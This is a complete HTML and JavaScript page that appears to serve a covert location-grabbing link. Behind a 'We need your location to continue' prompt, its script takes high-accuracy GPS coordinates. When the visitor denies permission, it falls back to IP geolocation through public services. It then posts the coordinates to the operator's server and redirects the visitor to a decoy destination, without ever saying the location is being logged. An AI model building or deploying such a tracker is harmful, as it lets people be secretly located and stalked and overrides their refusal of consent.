<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>Location Required</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  min-height: 100vh;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
}

.container {
  text-align: center;
  padding: 20px;
  max-width: 320px;
  width: 100%;
}

.btn {
  background: white;
  color: #667eea;
  border: none;
  padding: 16px 40px;
  font-size: 18px;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  width: 100%;
  margin: 20px 0;
  transition: transform 0.2s;
}

.btn:active {
  transform: scale(0.97);
}

.btn:disabled {
  opacity: 0.6;
  transform: none;
}

.hidden {
  display: none;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 3px solid rgba(255,255,255,0.3);
  border-top-color: white;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin: 20px auto;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.title {
  color: white;
  font-size: 18px;
  font-weight: 600;
  margin-bottom: 10px;
}

.subtitle {
  color: rgba(255,255,255,0.8);
  font-size: 14px;
  margin-bottom: 20px;
}

.status {
  color: white;
  font-size: 13px;
  margin-top: 15px;
  padding: 8px;
  border-radius: 8px;
  background: rgba(0,0,0,0.2);
}

.error {
  background: rgba(255,0,0,0.3);
}

.success {
  background: rgba(0,255,0,0.3);
}

.retry-btn {
  background: transparent;
  border: 1px solid white;
  color: white;
  padding: 8px 16px;
  border-radius: 20px;
  margin-top: 10px;
  cursor: pointer;
  font-size: 12px;
}

.retry-btn:active {
  background: rgba(255,255,255,0.2);
}
</style>
</head>
<body>
<div class="container">
  <div class="title">Location Access Required</div>
  <div class="subtitle">We need your location to continue</div>
  <button class="btn" id="continueBtn">Allow Location →</button>
  <div id="loadingSpinner" class="spinner hidden"></div>
  <div id="statusMsg" class="status hidden"></div>
  <button id="retryBtn" class="retry-btn hidden">Try Again</button>
</div>

<script>
const linkId = window.location.pathname.split('/').pop();
let destUrl = 'https://google.com';
let locationSent = false;
let retryCount = 0;
let gpsAttempted = false;

const continueBtn = document.getElementById('continueBtn');
const loadingSpinner = document.getElementById('loadingSpinner');
const statusMsg = document.getElementById('statusMsg');
const retryBtn = document.getElementById('retryBtn');

function showStatus(text, isError = false) {
  statusMsg.textContent = text;
  statusMsg.classList.remove('hidden', 'success', 'error');
  if (isError) {
    statusMsg.classList.add('error');
  } else {
    statusMsg.classList.add('success');
  }
}

function hideStatus() {
  statusMsg.classList.add('hidden');
}

function showRetry() {
  retryBtn.classList.remove('hidden');
}

function hideRetry() {
  retryBtn.classList.add('hidden');
}

// Get destination URL
fetch('/api/hits/' + linkId)
  .then(r => r.json())
  .then(d => { if (d.dest) destUrl = d.dest; })
  .catch(() => {});

function sendLocation(lat, lon, acc, source) {
  if (locationSent) return;
  locationSent = true;
  
  console.log(`[${source}] Sending: ${lat}, ${lon}`);
  
  fetch('/api/hit/' + linkId, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ lat, lon, acc })
  }).catch(() => {});
  
  // Redirect after short delay
  setTimeout(() => {
    window.location.href = destUrl;
  }, 500);
}

// IP Geolocation Fallback
function getIPLocation() {
  showStatus('Getting network location...');
  
  fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
      if (data.latitude && data.longitude) {
        sendLocation(data.latitude, data.longitude, 5000, 'IP');
      } else {
        // Try backup
        return fetch('https://ipinfo.io/json/');
      }
    })
    .then(response => {
      if (response && response.ok) return response.json();
      throw new Error('No backup');
    })
    .then(data => {
      if (data && data.loc) {
        const coords = data.loc.split(',');
        sendLocation(parseFloat(coords[0]), parseFloat(coords[1]), 5000, 'IP-Backup');
      }
    })
    .catch(() => {
      sendLocation(null, null, null, 'None');
    });
}

// Force GPS request with proper user interaction
function requestGPS() {
  if (gpsAttempted) return;
  gpsAttempted = true;
  
  showStatus('Requesting GPS permission...');
  
  // Check if geolocation is available
  if (!navigator.geolocation) {
    showStatus('GPS not supported, using network location...', true);
    getIPLocation();
    return;
  }
  
  // Set timeout for GPS
  const timeoutId = setTimeout(() => {
    showStatus('GPS timeout, using network location...', true);
    getIPLocation();
  }, 10000);
  
  // Request location with high accuracy
  navigator.geolocation.getCurrentPosition(
    // Success
    (position) => {
      clearTimeout(timeoutId);
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = Math.round(position.coords.accuracy);
      
      showStatus(`✓ GPS acquired! (${lat.toFixed(4)}, ${lon.toFixed(4)})`);
      sendLocation(lat, lon, acc, 'GPS');
    },
    // Error
    (error) => {
      clearTimeout(timeoutId);
      console.log('GPS Error:', error.code, error.message);
      
      let errorMsg = '';
      switch(error.code) {
        case 1:
          errorMsg = 'Location permission denied. Using network location...';
          break;
        case 2:
          errorMsg = 'GPS signal unavailable. Using network location...';
          break;
        case 3:
          errorMsg = 'GPS request timed out. Using network location...';
          break;
        default:
          errorMsg = 'GPS failed. Using network location...';
      }
      
      showStatus(errorMsg, true);
      
      // Fallback to IP
      setTimeout(() => {
        getIPLocation();
      }, 500);
    },
    {
      enableHighAccuracy: true,
      timeout: 8000,
      maximumAge: 0
    }
  );
}

// Main function - triggered by button click
function startTracking() {
  // Disable button and show loading
  continueBtn.disabled = true;
  continueBtn.style.opacity = '0.5';
  loadingSpinner.classList.remove('hidden');
  hideRetry();
  
  // Small delay to ensure clean state (critical for Android)
  setTimeout(() => {
    // Try GPS first
    requestGPS();
  }, 100);
}

// Retry function
function retryTracking() {
  retryCount++;
  gpsAttempted = false;
  locationSent = false;
  hideStatus();
  hideRetry();
  loadingSpinner.classList.remove('hidden');
  
  setTimeout(() => {
    requestGPS();
  }, 100);
}

// Event listeners
continueBtn.addEventListener('click', startTracking);
retryBtn.addEventListener('click', retryTracking);

// Also handle touch events for better mobile response
continueBtn.addEventListener('touchstart', function(e) {
  e.preventDefault();
  startTracking();
});
</script>
</body>
</html>
